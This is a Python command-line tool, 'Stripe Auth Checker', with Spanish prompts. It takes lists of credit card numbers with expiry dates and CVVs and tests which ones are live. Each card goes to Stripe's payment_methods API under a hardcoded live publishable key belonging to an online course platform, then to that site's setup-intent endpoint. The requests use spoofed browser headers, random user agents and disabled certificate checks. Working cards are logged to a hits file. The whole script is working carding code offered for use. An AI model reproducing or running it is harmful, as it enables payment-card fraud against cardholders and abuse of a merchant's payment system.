import os, sys, platform, time, random, json, ssl, urllib.parse, urllib.request, urllib.error
from http.cookiejar import CookieJar
from rich.console import Console
from rich.panel import Panel
from rich import box
from rich.align import Align

console = Console(highlight=False)

C1 = "#00BFFF"
C2 = "#1E90FF"
C3 = "#00008B"
W1 = "#FFFFFF"

PK_KEY = "pk_live_51NMHTlLvIw0k1EPu80ivQ0HYQ9NUotEncPEpUYYytP8YkUPB4vNGYICv1rB5Emf6nD1UzKXd0wKzdXnumGJqYPDt00Huwrpsfq"
STRIPE_VERSION = "2025-03-31.basil"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
]

def _clear(): os.system('cls' if os.name == 'nt' else 'clear')

def _get_os_name():
    if "com.termux" in os.environ.get("PREFIX", ""): return "termux"
    if os.name == "nt": return "powershell" if "PS" in os.environ.get("PROMPT", "") else "cmd"
    return platform.system().lower()

def draw_banner():
    banner_texto = (
        f"\n[bold {W1}]███████╗████████╗██████╗ ██╗██████╗ ███████╗[/bold {W1}]\n"
        f"[bold {C1}]██╔════╝╚══██╔══╝██╔══██╗██║██╔══██╗██╔════╝[/bold {C1}]\n"
        f"[bold {C1}]███████╗   ██║   ██████╔╝██║██████╔╝█████╗  [/bold {C1}]\n"
        f"[bold {C2}]╚════██║   ██║   ██╔══██╗██║██╔═══╝ ██╔══╝  [/bold {C2}]\n"
        f"[bold {C2}]███████║   ██║   ██║  ██║██║██║     ███████╗[/bold {C2}]\n"
        f"[bold {C3}]╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝     ╚══════╝[/bold {C3}]\n"
        f"\n[dim {W1}]    Stripe Auth Checker By DarkoDevv v1.0    [/dim {W1}]"
    )
    panel = Panel(
        Align.center(banner_texto, vertical="middle"),
        border_style=C2, box=box.ROUNDED, width=60, padding=(0, 1)
    )
    console.print(Align.center(panel))

def _make_opener():
    jar = CookieJar()
    handlers = [urllib.request.HTTPCookieProcessor(jar)]
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    handlers.append(urllib.request.HTTPSHandler(context=ctx))
    return urllib.request.build_opener(*handlers)

def _post_form(opener, url, form, timeout=20):
    data = urllib.parse.urlencode(form).encode()
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://js.stripe.com",
        "Referer": "https://js.stripe.com/",
    }
    req = urllib.request.Request(url, data=data, headers=headers)
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try: body = json.loads(e.read() or b"{}")
        except: body = {}
        return e.code, body
    except Exception as exc:
        return 0, {"_exc": str(exc)}

def check_auth(cc, mm, yy, cvv):
    opener = _make_opener()
    
    guid = ''.join(random.choices('0123456789abcdef', k=32))
    muid = ''.join(random.choices('0123456789abcdef', k=32))
    sid = ''.join(random.choices('0123456789abcdef', k=32))

    data_pm = {
        'type': 'card',
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_month]': mm,
        'card[exp_year]': yy,
        'guid': guid, 'muid': muid, 'sid': sid,
        'payment_user_agent': 'stripe.js/142f43c30d; stripe-js-v3/142f43c30d; card-element',
        'referrer': 'https://ezycourse.com',
        'time_on_page': str(random.randint(30000, 180000)),
        'key': PK_KEY,
        '_stripe_version': STRIPE_VERSION,
    }

    status, res_pm = _post_form(opener, 'https://api.stripe.com/v1/payment_methods', data_pm, timeout=20)

    if status == 0:
        return "DEAD", "TIMEOUT"

    if "error" in res_pm:
        msg = res_pm["error"].get("message", "").lower()
        if "incorrect number" in msg or "invalid number" in msg: return "DEAD", "INVALID_NUMBER"
        if "expired" in msg: return "DEAD", "EXPIRED_CARD"
        if "cvc" in msg: return "DEAD", "INVALID_CVC"
        if "captcha" in msg: return "DEAD", "CAPTCHA_REQUIRED"
        return "DEAD", msg.upper()[:25]

    pm_id = res_pm.get('id')
    if not pm_id: return "DEAD", "NO_PM_ID"

    headers_ezy = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://ezycourse.com",
        "Referer": "https://ezycourse.com/signup?plan=pro&interval=month&trial=true",
    }
    json_ezy = json.dumps({'stripe_payment_method_uuid': pm_id, 'is_trial': True}).encode()
    req_ezy = urllib.request.Request('https://ezycourse.com/api/ezycourse/onboarding/create-setup-intent', data=json_ezy, headers=headers_ezy, method='POST')
    
    try:
        with opener.open(req_ezy, timeout=20) as r:
            res_ezy = json.loads(r.read())
            if r.status == 200: return "LIVE", "Setup Intent OK"
            return "DEAD", f"HTTP_{r.status}"
    except urllib.error.HTTPError as e:
        try: body = json.loads(e.read() or b"{}")
        except: body = {}
        error_msg = str(body).lower()
        
        # Si el banco rechaza el Setup Intent, pero el Payment Method se creó, la tarjeta existe.
        if "requires_action" in error_msg or "authentication" in error_msg: 
            return "LIVE", "3D SECURE"
        if "insufficient" in error_msg or "funds" in error_msg: 
            return "LIVE_INSUFFICIENT", "Fondos insuficientes"
        
        # Si es un declined_by_bank, significa que el banco rechazó pero la tarjeta existe (CVV correcto).
        if "declined" in error_msg or "do not honor" in error_msg:
            return "LIVE_INSUFFICIENT", "Declined (Tarjeta viva, banco rechaza)"
            
        return "DEAD", "DECLINED_BY_BANK"
    except Exception:
        return "DEAD", "CONN_ERROR_EZY"

def run_single():
    _clear(); draw_banner()
    print("\n\033[1;37mModo: AUTH (Single)\033[0m")
    print("\033[1;37mIngresa la tarjeta:\033[0m ", end="", flush=True)
    linea = sys.stdin.readline().strip()
    if not linea: return

    parts = linea.replace("/", "|").split("|")
    if len(parts) < 4: return
    
    cc, mm, yy, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    if len(yy) == 4: yy = yy[2:]
    
    estado, info = check_auth(cc, mm, yy, cvv)
    display = f"{cc[:6]}******{cc[-4:]}"

    print()
    if estado == "LIVE":
        print(f"\033[1;37;42m LIVE \033[0m \033[1;32m{display}\033[0m | {info}")
        with open("stripe_hits.txt", "a") as f:
            f.write(f"{linea} | AUTH | LIVE | {info}\n")
    elif estado == "LIVE_INSUFFICIENT":
        print(f"\033[1;37;43m LIVE \033[0m \033[1;33m{display}\033[0m | \033[2m{info}\033[0m")
        with open("stripe_hits.txt", "a") as f:
            f.write(f"{linea} | AUTH | LIVE_INSUFFICIENT | {info}\n")
    else:
        print(f"\033[1;37;41m DEAD \033[0m \033[1;31m{display}\033[0m | \033[2m{info}\033[0m")

def run_mass(delay):
    _clear(); draw_banner()
    print("\n\033[1;37mModo: AUTH (Mass)\033[0m")
    print("\033[1;37mRuta del archivo (ej: cards.txt):\033[0m ", end="", flush=True)
    filename = os.path.expanduser(os.path.expandvars(sys.stdin.readline().strip()))
    
    if not filename or not os.path.exists(filename):
        print(f"\n\033[1;31m[-] Archivo no encontrado en: {filename}\033[0m")
        time.sleep(2)
        return

    with open(filename, "r", encoding="utf-8", errors="ignore") as f:
        lines = [l.strip() for l in f if l.strip() and "|" in l]

    if not lines:
        print("\n\033[1;31m[-] El archivo está vacío o no tiene tarjetas válidas.\033[0m")
        time.sleep(2)
        return

    _clear(); draw_banner()
    print(f"\n\033[1;36m[+] Iniciando Mass Check (AUTH) - {len(lines)} tarjetas\033[0m\n")

    hits = 0
    for i, linea in enumerate(lines, 1):
        parts = linea.replace("/", "|").split("|")
        if len(parts) < 4: continue
        
        cc, mm, yy, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
        if len(yy) == 4: yy = yy[2:]
        
        estado, info = check_auth(cc, mm, yy, cvv)
        display = f"{cc[:6]}******{cc[-4:]}"

        pos = f"\033[2m[{i}/{len(lines)}]\033[0m"
        
        if estado == "LIVE":
            hits += 1
            print(f"{pos} \033[1;37;42m LIVE \033[0m \033[1;32m{display}\033[0m | {info}")
            with open("stripe_hits.txt", "a") as f:
                f.write(f"{linea} | AUTH | LIVE | {info}\n")
        elif estado == "LIVE_INSUFFICIENT":
            hits += 1
            print(f"{pos} \033[1;37;43m LIVE \033[0m \033[1;33m{display}\033[0m | \033[2m{info}\033[0m")
            with open("stripe_hits.txt", "a") as f:
                f.write(f"{linea} | AUTH | LIVE_INSUFFICIENT | {info}\n")
        else:
            print(f"{pos} \033[1;37;41m DEAD \033[0m \033[1;31m{display}\033[0m | \033[2m{info}\033[0m")

        if i < len(lines):
            time.sleep(delay)
            
    print(f"\n\033[1;32m[✅] Completado. Hits: {hits}/{len(lines)}\033[0m")

def menu():
    os_name = _get_os_name()
    delay = 2.5
    
    while True:
        _clear(); draw_banner()
        print(f"\n\033[1;34m[1]\033[0m Stripe Auth (Mass)")
        print(f"\033[1;34m[2]\033[0m Stripe Auth (Single)")
        print(f"\033[1;34m[0]\033[0m Salir\n")
        
        print(f"\033[1;34m┌──\033[0m(\033[1;34mStripeAuth\033[0m㉿\033[1;34m{os_name}\033[0m)")
        print(f"\033[1;34m└─\033[0m\033[1;37m$\033[0m ", end="", flush=True)

        choice = sys.stdin.readline().strip()
        print("\033[F\033[K", end="", flush=True)

        if choice == "0":
            _clear(); draw_banner()
            print("\n\033[1;37mHasta luego, espero que vuelvas 👋🏻\033[0m\n")
            break
        elif choice == "1":
            run_mass(delay)
            input("\nPresiona Enter para volver...")
        elif choice == "2":
            run_single()
            input("\nPresiona Enter para volver...")

if __name__ == "__main__":
    menu()
